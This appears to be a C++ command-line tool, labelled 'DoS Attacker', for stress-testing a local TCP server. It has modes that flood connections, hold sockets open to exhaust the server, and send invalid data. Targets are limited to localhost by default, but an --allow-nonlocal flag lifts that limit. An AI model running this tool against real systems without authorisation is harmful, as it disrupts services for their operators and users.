// DoS Attacker
// Modes:
//   connect: rapid connect/close
//     - duration: total time to keep attempting connects
//     - rate: sleep between each connect attempt (ms)
//     - connections: not a cap; attempts run until duration expires
//   hold: open connections and hold them open
//     - connections: max number of sockets to open and hold
//     - rate: sleep between opening each connection (ms)
//     - duration: total runtime; close all open sockets when time expires
//   garbage: connect and send invalid data
//     - connections: number of connect+send attempts
//     - rate: sleep between attempts (ms)
//     - duration: informational only (not used)

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cerrno>
#include <chrono>
#include <cstring>
#include <iostream>
#include <string>
#include <thread>
#include <vector>

namespace {

void print_usage(const char* prog) {
    std::cout << "Usage:\n";
    std::cout << "  " << prog << " --mode <connect|hold|garbage> [options]\n\n";
    std::cout << "Options:\n";
    std::cout << "  --ip <addr>         Target IPv4 (default: 127.0.0.1)\n";
    std::cout << "  --port <port>       Target port (default: 3000)\n";
    std::cout << "  --connections <n>   Number of connections (default: 50)\n";
    std::cout << "  --duration <sec>    Duration in seconds (default: 5)\n";
    std::cout << "  --rate <ms>         Sleep between connects in ms (default: 20)\n";
    std::cout << "  --allow-nonlocal    Allow non-127.0.0.1 targets (unsafe)\n";
    std::cout << "  -h, --help          Show this help\n";
    std::cout.flush();
}

bool is_localhost_ip(const std::string& ip) {
    if (ip == "127.0.0.1") return true;
    if (ip.rfind("127.", 0) == 0) return true;
    return false;
}

int connect_socket(const std::string& ip, int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    sockaddr_in addr;
    std::memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(static_cast<uint16_t>(port));

    if (inet_pton(AF_INET, ip.c_str(), &addr.sin_addr) != 1) {
        close(fd);
        return -1;
    }

    if (connect(fd, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) < 0) {
        close(fd);
        return -1;
    }

    return fd;
}

} // namespace

int main(int argc, char* argv[]) {
    std::string ip = "127.0.0.1";
    int port = 3000;
    int connections = 50;
    int duration_sec = 5;
    int rate_ms = 20;
    bool allow_nonlocal = false;
    std::string mode;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-h" || arg == "--help") {
            print_usage(argv[0]);
            return 0;
        } else if (arg == "--ip" && i + 1 < argc) {
            ip = argv[++i];
        } else if (arg == "--port" && i + 1 < argc) {
            port = std::stoi(argv[++i]);
        } else if (arg == "--connections" && i + 1 < argc) {
            connections = std::stoi(argv[++i]);
        } else if (arg == "--duration" && i + 1 < argc) {
            duration_sec = std::stoi(argv[++i]);
        } else if (arg == "--rate" && i + 1 < argc) {
            rate_ms = std::stoi(argv[++i]);
        } else if (arg == "--mode" && i + 1 < argc) {
            mode = argv[++i];
        } else if (arg == "--allow-nonlocal") {
            allow_nonlocal = true;
        } else {
            std::cerr << "Unknown or incomplete option: " << arg << "\n";
            print_usage(argv[0]);
            return 1;
        }
    }

    if (mode.empty()) {
        std::cerr << "Missing --mode\n";
        print_usage(argv[0]);
        return 1;
    }

    if (!allow_nonlocal && !is_localhost_ip(ip)) {
        std::cerr << "Refusing non-local target: " << ip << "\n";
        std::cerr << "Use --allow-nonlocal to override (not recommended).\n";
        return 1;
    }

    std::cout << "Mode: " << mode << "\n";
    std::cout << "Target: " << ip << ":" << port << "\n";
    std::cout << "Connections: " << connections << ", Duration: " << duration_sec
              << "s, Rate: " << rate_ms << "ms\n";

    auto run_start = std::chrono::steady_clock::now();

    if (mode == "connect") {
        auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(duration_sec);
        int attempts = 0;
        int success = 0;
        while (std::chrono::steady_clock::now() < end_time) {
            int fd = connect_socket(ip, port);
            attempts++;
            if (fd >= 0) {
                success++;
                close(fd);
            }
            if (rate_ms > 0) {
                std::this_thread::sleep_for(std::chrono::milliseconds(rate_ms));
            }
        }
        std::cout << "Connect attempts: " << attempts << ", success: " << success << "\n";
    } else if (mode == "hold") {
        std::vector<int> fds;
        fds.reserve(static_cast<size_t>(connections));
        auto start_time = std::chrono::steady_clock::now();
        auto end_time = start_time + std::chrono::seconds(duration_sec);

        for (int i = 0; i < connections; ++i) {
            if (std::chrono::steady_clock::now() >= end_time) {
                break;
            }
            int fd = connect_socket(ip, port);
            if (fd >= 0) {
                fds.push_back(fd);
            }
            if (rate_ms > 0) {
                std::this_thread::sleep_for(std::chrono::milliseconds(rate_ms));
            }
        }

        auto now = std::chrono::steady_clock::now();
        if (now < end_time) {
            auto remaining = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - now);
            std::cout << "Holding " << fds.size() << " connections for "
                      << remaining.count() << "ms\n";
            std::this_thread::sleep_for(remaining);
        } else {
            std::cout << "Duration expired during connect phase; closing " << fds.size() << " connections\n";
        }

        for (int fd : fds) close(fd);
    } else if (mode == "garbage") {
        int sent = 0;
        for (int i = 0; i < connections; ++i) {
            int fd = connect_socket(ip, port);
            if (fd >= 0) {
                const char* payload = "garbage";
                send(fd, payload, std::strlen(payload), 0);
                close(fd);
                sent++;
            }
            if (rate_ms > 0) {
                std::this_thread::sleep_for(std::chrono::milliseconds(rate_ms));
            }
        }
        std::cout << "Garbage sent on " << sent << " connections\n";
    } else {
        std::cerr << "Unknown mode: " << mode << "\n";
        return 1;
    }

    auto run_end = std::chrono::steady_clock::now();
    auto elapsed_ms = std::chrono::duration_cast<std::chrono::milliseconds>(run_end - run_start).count();
    std::cout << "Elapsed time: " << elapsed_ms << "ms\n";

    return 0;
}
